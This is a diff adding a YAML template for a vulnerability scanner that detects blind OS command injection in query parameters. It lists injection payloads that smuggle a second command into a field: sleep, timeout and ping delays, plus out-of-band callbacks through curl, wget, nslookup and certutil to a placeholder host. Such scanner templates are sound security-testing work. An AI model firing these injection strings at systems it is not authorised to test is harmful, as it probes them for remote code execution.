@@ -1,0 +1,41 @@
+id: cmdi-blind
+info:
+  name: "Blind OS Command Injection"
+  severity: high
+  description: "Detects blind command injection via time delays and OOB callbacks"
+  tags: [cmdi, injection, rce, blind]
+  author: Wired
+
+inject: query_params
+detection: time
+
+payloads: []
+
+time_payloads:
+  delay_seconds: 5
+  payloads:
+    - ";sleep 5"
+    - "|sleep 5"
+    - "||sleep 5"
+    - "&&sleep 5"
+    - "`sleep 5`"
+    - "$(sleep 5)"
+    - ";ping -c 6 127.0.0.1"
+    - "|timeout /t 5 /nobreak"
+    - "&timeout /t 5 /nobreak"
+    - ";python3 -c 'import time;time.sleep(5)'"
+
+oob_payloads:
+  - ";curl {{OOB_URL}}"
+  - "|curl {{OOB_URL}}"
+  - "$(curl {{OOB_URL}})"
+  - "`curl {{OOB_URL}}`"
+  - ";wget {{OOB_URL}} -O /dev/null"
+  - ";nslookup {{OOB_DOMAIN}}"
+  - "|nslookup {{OOB_DOMAIN}}"
+  - "$(nslookup {{OOB_DOMAIN}})"
+  - ";ping -c 1 {{OOB_DOMAIN}}"
+  - "|certutil -urlcache -f {{OOB_URL}} NUL"
+
+matchers:
+  body_patterns: []
